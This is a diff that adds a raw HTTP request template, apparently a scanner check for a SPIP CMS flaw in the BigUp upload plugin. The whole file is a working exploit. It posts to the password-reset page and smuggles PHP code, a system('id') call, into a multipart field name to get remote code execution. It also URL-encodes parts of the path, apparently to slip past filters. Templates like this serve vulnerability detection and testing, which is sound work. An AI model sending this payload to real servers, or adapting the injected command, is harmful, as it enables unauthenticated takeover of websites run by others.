@@ -1,0 +1,46 @@
+POST /spip.ph%70?pag%65=spip_pass&lang=fr HTTP/1.1
+Host: {{HOST}}
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.140
+Connection: close
+Content-Length: 1126
+Content-Type: multipart/form-data; boundary=5f02b65945d644d6a32847ab130e9586
+Accept-Encoding: gzip, deflate
+
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="page"
+
+spip_pass
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="lang"
+
+fr
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="formulaire_action"
+
+oubli
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="formulaire_action_args"
+
+{{TOKEN}}
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="formulaire_action_sign"
+
+
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="oubli"
+
+2mbIund3ssUVxtIAdSbvmQlCFNr@P5IrE.com
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="nobot"
+
+
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="bigup_retrouver_fichiers"
+
+a
+--5f02b65945d644d6a32847ab130e9586
+Content-Disposition: form-data; name="RCE['.system('id').die().']"; filename="myhqh.txt"
+Content-Type: text/plain
+
+2mbIund3ssUVxtIAdSbvmQlCFNr
+--5f02b65945d644d6a32847ab130e9586--
